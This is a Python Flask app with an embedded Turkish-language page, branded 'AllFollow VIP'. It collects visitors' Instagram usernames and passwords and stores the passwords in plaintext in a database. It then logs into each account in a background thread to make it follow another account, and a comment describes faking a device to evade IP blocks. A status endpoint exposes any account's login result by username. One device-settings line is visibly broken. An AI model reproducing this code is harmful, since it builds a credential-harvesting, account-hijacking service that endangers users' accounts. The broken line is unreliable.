import os
import threading
import time
import random
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from instagrapi.exceptions import ChallengeRequired, BadPassword, LoginRequired
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

class IGAccount(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)
    status = db.Column(db.String(100), default="Sıraya Alındı...")
    last_error = db.Column(db.Text, nullable=True)

# ASIL BOT MOTORU - ASENKRON ÇALIŞIR
def start_insta_task(u, p):
    with app.app_context():
        cl = Client()
        acc = IGAccount.query.filter_by(username=u).first()
        try:
            # Render IP'si engelliyse cihaz taklidi şart
            cl.set_device_settings(cl.delay_range == [2, 4])
            
            # Instagram'a giriş denemesi (Burası 20-30 sn sürebilir)
            if cl.login(u, p):
                acc.status = "AKTİF ✅"
                acc.last_error = None
                db.session.commit()
                # Örnek işlem: Kendi profilini takip et veya birini beğen
                cl.user_follow(cl.user_id_from_username("instagram"))
        except ChallengeRequired:
            acc.status = "KOD GEREKLİ ⚠️"
            db.session.commit()
        except BadPassword:
            acc.status = "ŞİFRE HATALI ❌"
            db.session.commit()
        except Exception as e:
            acc.status = "BAĞLANTI ENGELİ 🚫"
            acc.last_error = str(e)
            db.session.commit()

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/connect', methods=['POST'])
def connect():
    data = request.json
    u, p = data.get('u'), data.get('p')
    if not u or not p: return jsonify(error="Eksik bilgi")

    acc = IGAccount.query.filter_by(username=u).first()
    if not acc:
        acc = IGAccount(username=u, password=p)
        db.session.add(acc)
    else:
        acc.password, acc.status = p, "Giriş Yapılıyor..."
    db.session.commit()
    
    # --- KRİTİK NOKTA ---
    # Thread başlatıyoruz ve Flask HİÇ BEKLEMEDEN "ok" dönüyor.
    # Bu sayede Render bağlantıyı koparamıyor.
    threading.Thread(target=start_insta_task, args=(u, p)).start()
    
    return jsonify(status="started")

@app.route('/api/check/<u>')
def check_status(u):
    acc = IGAccount.query.filter_by(username=u).first()
    if acc:
        return jsonify(status=acc.status, error=acc.last_error)
    return jsonify(status="Hesap bulunamadı")

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AllFollow VIP</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #000; color: #eee; font-family: 'Inter', sans-serif; }
        .glass { background: #111; border: 1px solid #333; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .page { display: none; } .active { display: block; animation: fadeIn 0.4s ease; }
        @keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
        .loader { border: 2px solid #333; border-top: 2px solid #a855f7; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-6">

    <div id="login-page" class="page active glass p-8 w-full max-w-[340px] text-center">
        <h1 class="text-3xl font-black italic text-purple-600 mb-8 tracking-tighter">ALLFOLLOW</h1>
        <input id="u" placeholder="Kullanıcı Adı" class="w-full bg-zinc-900 border border-zinc-800 p-3 rounded-xl mb-3 outline-none focus:border-purple-500">
        <input id="p" type="password" placeholder="Şifre" class="w-full bg-zinc-900 border border-zinc-800 p-3 rounded-xl mb-6 outline-none focus:border-purple-500">
        <button onclick="login()" class="w-full bg-purple-600 font-bold py-3 rounded-xl hover:bg-purple-500 active:scale-95 transition">SİSTEME GİRİŞ</button>
    </div>

    <div id="status-page" class="page glass p-8 w-full max-w-[340px] text-center">
        <div class="flex justify-center mb-6"><div class="loader"></div></div>
        <h2 class="text-sm font-bold text-zinc-500 uppercase tracking-widest mb-2">İşlem Durumu</h2>
        <div id="status-text" class="text-xl font-black text-purple-400 italic mb-6 uppercase">BAĞLANILIYOR...</div>
        <p id="user-display" class="text-xs text-zinc-600 font-mono"></p>
        <div id="error-log" class="text-[10px] text-red-900 mt-4 break-words"></div>
    </div>

    <script>
        let targetUser = "";
        async function login() {
            targetUser = document.getElementById('u').value;
            const p = document.getElementById('p').value;
            if(!targetUser || !p) return;

            // Hemen sayfa değiştir (Zaman aşımını önlemek için ilk adım)
            document.getElementById('login-page').classList.remove('active');
            document.getElementById('status-page').classList.add('active');
            document.getElementById('user-display').innerText = "@" + targetUser;

            // Sunucuya isteği fırlat (Cevap beklemeden devam eder)
            fetch('/api/connect', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({u: targetUser, p: p})
            });

            // Her 3 saniyede bir veritabanından durumu kontrol et
            const checker = setInterval(async () => {
                const r = await fetch('/api/check/' + targetUser);
                const d = await r.json();
                const st = document.getElementById('status-text');
                
                st.innerText = d.status;
                if(d.error) document.getElementById('error-log').innerText = d.error;

                if(d.status.includes('✅') || d.status.includes('❌') || d.status.includes('🚫')) {
                    // İşlem bittiğinde loader'ı durdurabiliriz
                    document.querySelector('.loader').style.display = 'none';
                    clearInterval(checker);
                }
            }, 3000);
        }
    </script>
</body>
</html>
"""

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
